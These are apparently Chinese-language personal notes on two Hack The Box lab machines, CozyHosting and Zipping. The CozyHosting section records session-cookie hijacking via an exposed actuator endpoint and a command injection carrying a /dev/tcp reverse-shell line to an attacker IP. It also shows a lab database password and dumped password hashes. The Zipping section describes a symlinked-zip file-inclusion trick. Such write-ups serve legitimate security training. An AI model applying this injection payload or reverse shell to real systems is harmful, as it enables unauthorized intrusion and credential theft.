## CozyHosting
#eASY #Linux

nmap 扫描端口

dirsearch 扫描目录

![](attachments/Pasted%20image%2020230910150836.png)

`http://cozyhosting.htb/actuator/sessions`

![](attachments/Pasted%20image%2020230910150903.png)

配置cookie登录，访问admin

![](attachments/Pasted%20image%2020230910151303.png)

host ：127.0.0.1
username: root

![](attachments/Pasted%20image%2020230910153419.png)

这里应该是命令执行 ssh


![](attachments/Pasted%20image%2020230910153533.png)

带有username和host的是`[-J [user@]host[:port]]`

```
;`(sh)0>/dev/tcp/10.10.16.8/9999`
exec >&0
```
![](attachments/Pasted%20image%2020230910164753.png)

script /dev/null -c bash 美化

![](attachments/Pasted%20image%2020230910164957.png)

python 将jar包下载

![](attachments/Pasted%20image%2020230910195809.png)


`psql "postgresql://postgres:Vg&nvzAQ7XxR@localhost/postgres"`

连接进入

![](attachments/Pasted%20image%2020230911075447.png)

```
kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
```

## Zipping
#Linux #Medium
nmap没有扫到其他多余端口

dirseach扫描

![](attachments/Pasted%20image%2020230913102902.png)



![](attachments/Pasted%20image%2020230913102958.png)

没有办法上传php，但是考验利用link实现文件包含

![](attachments/Pasted%20image%2020230913104433.png)

打压缩包，用·`--symlinks`参数 用了这个参数，打在压缩包的时候，是一个链接文件，而不是链接的目标文件

![](attachments/Pasted%20image%2020230913105315.png)

